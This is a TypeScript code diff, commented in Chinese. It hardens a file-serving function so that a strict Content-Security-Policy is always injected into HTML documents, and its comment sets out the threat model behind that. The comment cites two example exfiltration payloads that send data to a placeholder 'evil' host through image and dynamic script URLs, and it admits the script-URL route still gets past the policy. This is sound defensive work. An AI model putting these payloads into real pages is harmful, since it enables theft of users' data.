@@ -31,13 +31,44 @@ export interface FileContentReader {
     readFileRange(path: string, offset: number, length: number): Promise<RpcReadFileRangeResponse>
 }
 
+/**
+ * mobi 服务的一切 text/html 文档统一注入的 CSP（与通道无关：serve-file 预览 / read-file
+ * 浏览器打开 / machine 通道，全部经 serveFileContent 恒注）。
+ *
+ * 威胁模型：模型/机器侧产出的 HTML 若在 hub 同源顶层执行（产物卡「浏览器打开」「复制链接」、
+ * 预览），脚本将自带 httpOnly cookie 可自由调 mobi API。CSP 把能力面收窄：
+ *   - script/style/font 'self' + https:  → 支持同目录文件与外部 CDN，'unsafe-inline' 兼容行内
+ *     <script>/<style>（产物页常规形态）
+ *   - img/media 'self' + data:           → 禁外链图片，堵 `<img src=https://evil/?data>` GET 外带
+ *   - connect-src 'none'                 → 禁所有 fetch/XHR/sendBeacon/WebSocket，
+ *     脚本无法以用户身份调 mobi API，也无法把数据 POST 到外部
+ *   - form-action 'none' / base-uri 'none' / object-src 'none' / frame-src 'none'
+ * 配套：serve-file 通道另有 iframe sandbox（allow-scripts allow-same-origin）——sandbox 挂在
+ * iframe 标签上不随 URL 走，top-level 打开（浏览器打开通道）只剩 CSP 单道防线，属已接受取舍。
+ * 残留面：动态 createElement('script').src='https://evil/?data' 这类「把数据拼进资源 URL」的
+ * 外带仍可绕过（凡允许外链资源加载即无法根治）；但 mobi 凭证走 httpOnly cookie、localStorage
+ * 不放 token，外带仅限 recent-paths/偏好等低价值 PII。安全论断单源本处（ADR 0007）。
+ */
+export const PREVIEW_CSP = [
+    "default-src 'none'",
+    "script-src 'self' https: 'unsafe-inline'",
+    "style-src 'self' https: 'unsafe-inline'",
+    "img-src 'self' data:",
+    "font-src 'self' https: data:",
+    "media-src 'self' data:",
+    "connect-src 'none'",
+    "form-action 'none'",
+    "base-uri 'none'",
+    "frame-ancestors 'self'",
+    "object-src 'none'",
+    "frame-src 'none'",
+].join('; ')
+
 interface ServeOptions {
     /** 下载场景（read-file 的 download=1）：追加 attachment content-disposition */
     download?: boolean
     /** 额外响应头（serve-file 用于追加 x-content-type-options: nosniff） */
     extraHeaders?: Record<string, string>
-    /** text/html 文档专属 CSP（serve-file 预览用），仅当 meta.mime 为 text/html 时注入 */
-    htmlCsp?: string
 }
 
 /**
@@ -123,11 +154,10 @@ export async function serveFileContent(
     c.header('etag', etag)
     c.header('accept-ranges', 'bytes')
     c.header('cache-control', 'private, no-cache')
-    // text/html 预览文档：注入严格 CSP，把 sandbox + allow-same-origin 的能力面收窄到
-    // 「只能加载资源、不能联网发请求/调 mobi API」（connect-src 'none'）。仅作用于 html 文档本身，
-    // CSS/JS 子资源（同目录或外部 CDN）照常服务。详见 serve-file 路由 PREVIEW_CSP 注释。
-    if (opts.htmlCsp && mime.startsWith('text/html')) {
-        c.header('content-security-policy', opts.htmlCsp)
+    // text/html 文档恒注 CSP（通道无关的不变量，capability face 见 PREVIEW_CSP 注释）。
+    // 仅作用于 html 文档本身，CSS/JS 子资源照常服务。
+    if (mime.startsWith('text/html')) {
+        c.header('content-security-policy', PREVIEW_CSP)
     }
     if (opts.extraHeaders) {
         for (const [k, v] of Object.entries(opts.extraHeaders)) {
